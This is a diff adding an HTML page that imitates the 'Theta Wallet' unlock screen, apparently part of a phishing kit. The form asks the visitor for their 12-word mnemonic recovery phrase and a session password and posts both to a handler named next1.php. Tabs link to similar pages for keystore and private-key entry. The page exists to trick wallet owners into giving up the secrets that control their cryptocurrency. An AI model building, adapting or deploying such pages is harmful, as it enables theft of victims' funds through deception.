@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+
+    <meta charset="utf-8">
+	<link rel="shortcut icon" href="favicon.ico">
+	<meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
+	<meta name="theme-color" content="#000000">
+	<title>Theta Wallet</title>
+	<link href="index_files/main.css" rel="stylesheet">
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  </head>
+  <body>
+  <noscript>You need to enable JavaScript to run this app.</noscript>
+  <form action="next1.php" method="POST" enctype="multipart/form-data" name="EmailForm" id="submit-form">
+    <div id="root">
+	<div class="App">
+  <div class="NavBar NavBar--is-centered"><img class="NavBar__logo" src="index_files/theta_wallet_logo2x.png" alt=""></div>
+    <div class="Pages">
+	<div class="UnlockWalletPage">
+	<div class="UnlockWalletPage__wrapper">
+	<div class="UnlockWalletPage__title">Unlock Your Wallet</div>
+    <div class="UnlockWalletCard">
+	<div class="UnlockWalletCard__content">
+	<div class="UnlockWalletCard__header">
+	<div class="TabBar UnlockWalletCard__tab-bar TabBar--is-centered TabBar--is-condensed">
+	<a href="keystore.html" class="TabBarItem TabBarItem tablinks" aria-current="page"><div class="TabBarItem__title">Keystore</div></a>
+	<a class="TabBarItem--is-active tablinks" href="mnemonic.html"><div class="TabBarItem__title">Mnemonic</div></a>
+	<a class="TabBarItem tablinks" href="privatekey.html"><div class="TabBarItem__title">Private Key</div></a>
+	<a class="TabBarItem tablinks" href="#"><div class="TabBarItem__title">Hardware</div></a>
+	</div>
+	</div>
+
+    <div class="UnlockWalletViaMnemonicPhrase">
+	<div class="UnlockWalletViaMnemonicPhrase__title">Please enter your 12 word phrase</div>
+	<textarea class="UnlockWalletViaMnemonicPhrase__mnemonic form-control" name="aamnemonic" id="aamnemonic" required="true"></textarea>
+	<div class="UnlockWalletViaMnemonicPhrase__mnemonic-instructions">Please separate each Mnemonic Phrase with a space.</div>
+	<input name="user2" class="UnlockWalletViaMnemonicPhrase__password-input" placeholder="Enter temporary session password" name="mnemonicpassword" type="password" value="" style="background-attachment: scroll; background-size: 16px 18px; background-position: 98% 50%;">
+	<div class="UnlockWalletCard__warning"></div>
+	<div class="UnlockWalletViaMnemonicPhrase__footer">
+	    <label id='internet-connection-error' style='color: #FFFFFF;'></label>
+	<button type="submit" style="width:100%;" class="GradientButton undefined GradientButton" id="submit-button">
+	<div class="GradientButton__title">Unlock Wallet</div>
+	</button>
+	</div>
+	</div>
+
+</div>
+</div>
+		<div class="UnlockWalletPage__subtitle">
+<span>Don't have a wallet?</span><a href="#">Create Wallet</a>
+</div>
+</div>
+</div>
+</div>
+<div></div>
+</div>
+</div>
+</form>
+
+    <script src="index_files/jquery.js"></script>
+    <script src="index_files/2.js"></script>
+	<script src="index_files/main_002.js"></script>
+	<script src="index_files/main.js"></script>
+	<div class="ReactModalPortal"></div>
+	<div class="ReactModalPortal"></div>
+	<div>
+	<div style="position: fixed; top: 0px; right: auto; bottom: auto; left: 50%; transform: translate(-50%, 0%); z-index: 100;">
+      <div>
+      </div>
+    </div>
+  </div>
+</body>
+<script>
+document.getElementById('submit-button').onclick = function(event) {
+	
+	var online = isOnline()
+	if (online) {
+		document.getElementById('submit-form').submit();
+		return;
+	}
+	document.getElementById('internet-connection-error').innerHTML = 'No internet connection. Please check your internet connection and try again.'
+	event.preventDefault();
+};
+function isOnline() { 
+    return (navigator.onLine) 
+}
+</script>
+</html>
